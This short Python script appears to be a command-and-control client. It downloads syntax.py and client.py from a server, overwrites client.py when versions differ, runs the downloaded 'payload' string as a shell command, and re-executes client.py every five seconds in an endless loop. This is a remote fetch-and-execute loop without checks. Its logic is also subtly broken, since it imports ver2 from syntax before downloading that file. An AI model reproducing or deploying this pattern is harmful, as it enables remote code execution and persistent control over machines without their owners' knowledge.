import os
import requests
from syntax import *
url2 = 'http://localhost:3000/client.py'
url = 'http://localhost:3000/syntax.py'
r = requests.get(url, allow_redirects=True)
r2 = requests.get(url2, allow_redirects=True)
open('syntax.py', 'wb').write(r.content)
ver = 1.3
# See if ver is same as ver2 and if not dont run
if ver != ver2:
    open('client.py', 'wb').write(r2.content)
    print("ver is different")
import syntax
os.system(syntax.payload)
from time import time, sleep
while True:
    sleep(5 - time() % 5)
    os.system("python3 client.py")